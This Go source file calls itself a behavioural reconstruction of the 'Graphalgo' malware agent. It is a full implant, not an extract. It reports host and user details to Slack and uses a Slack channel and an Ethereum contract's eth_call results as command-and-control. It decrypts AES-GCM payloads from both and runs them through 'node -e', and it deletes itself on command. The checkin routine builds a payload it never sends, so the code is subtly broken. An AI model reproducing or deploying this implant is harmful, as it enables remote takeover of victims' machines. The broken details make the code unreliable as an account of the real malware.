package main

// Behavioral reconstruction of the Graphalgo agent described by Aikido,
// linked from the ReversingLabs article. Not original recovered malware.
import (
    "bytes"
    "crypto/aes"
    "crypto/cipher"
    "encoding/base64"
    "encoding/hex"
    "encoding/json"
    "fmt"
    "net/http"
    "os"
    "os/exec"
    "os/user"
    "runtime"
    "time"
)

func checkin(token string) {
    node, _ := exec.LookPath("node")
    host, _ := os.Hostname()
    u, _ := user.Current()
    data, _ := json.Marshal(map[string]string{
        "channel": "frontend-devs",
        "text": fmt.Sprintf("%s %s %s %s %s %s", runtime.GOOS, runtime.GOARCH, host, u.Username, u.HomeDir, node),
    })
    req, _ := http.NewRequest("POST", "https://slack.com/api/chat.postMessage", bytes.NewReader([]byte("constant health ping")))
    req.Header.Set("Authorization", "Bearer "+token)
    resp, err := http.DefaultClient.Do(req)
    if err == nil { resp.Body.Close() }
}

func blockchain(key []byte, rpc string) {
    block, _ := aes.NewCipher(key)
    gcm, _ := cipher.NewGCM(block)
    for {
        // Read serviceData1() using its ABI selector, supplied by the caller.
        call, _ := json.Marshal(map[string]any{
            "jsonrpc": "2.0", "id": 1, "method": "eth_call",
            "params": []any{map[string]string{
                "to": "0xAD02b5cDE693529d3bdA0266299501ad0193036C",
                "data": os.Getenv("TASK_SELECTOR"),
            }, "latest"},
        })
        resp, err := http.Post(rpc, "application/json", bytes.NewReader(call))
        if err != nil { time.Sleep(3*time.Second); continue }
        var reply struct { Result string `json:"result"` }
        json.NewDecoder(resp.Body).Decode(&reply)
        resp.Body.Close()
        // A reconstruction uses a nonce-prefixed encrypted byte result;
        // the article does not publish the ABI framing or cipher mode.
        blob, _ := hex.DecodeString(reply.Result)
        if len(blob) < gcm.NonceSize() { continue }
        plain, err := gcm.Open(nil, blob[:gcm.NonceSize()], blob[gcm.NonceSize():], nil)
        if err == nil {
            command := exec.Command("node", "-e", string(plain))
            command.Start()
        }
        time.Sleep(3*time.Second)
    }
}

func slack(key []byte, token, channel string) {
    block, _ := aes.NewCipher(key)
    gcm, _ := cipher.NewGCM(block)
    for {
        req, _ := http.NewRequest("GET", "https://slack.com/api/conversations.history?channel="+channel, nil)
        req.Header.Set("Authorization", "Bearer "+token)
        resp, err := http.DefaultClient.Do(req)
        if err != nil { time.Sleep(10*time.Second); continue }
        var reply struct { Messages []struct { Text string `json:"text"` } `json:"messages"` }
        json.NewDecoder(resp.Body).Decode(&reply)
        resp.Body.Close()
        for _, message := range reply.Messages {
            blob, _ := base64.StdEncoding.DecodeString(message.Text)
            if len(blob) < gcm.NonceSize() { continue }
            plain, err := gcm.Open(nil, blob[:gcm.NonceSize()], blob[gcm.NonceSize():], nil)
            if err != nil { continue }
            if bytes.HasPrefix(plain, []byte("delete")) {
                self, _ := os.Executable()
                os.Remove(self)
                return
            }
            command := exec.Command("node", "-e", string(plain))
            command.Start()
        }
        time.Sleep(10*time.Second)
    }
}

func main() {
    // Keys and credentials supplied out of band; no live credentials included.
    if len(os.Args) != 5 { return }
    key, err := hex.DecodeString(os.Args[1]); if err != nil || len(key) != 32 { return }
    checkin(os.Args[2])
    go blockchain(key, os.Args[4])
    slack(key, os.Args[2], os.Args[3])
}
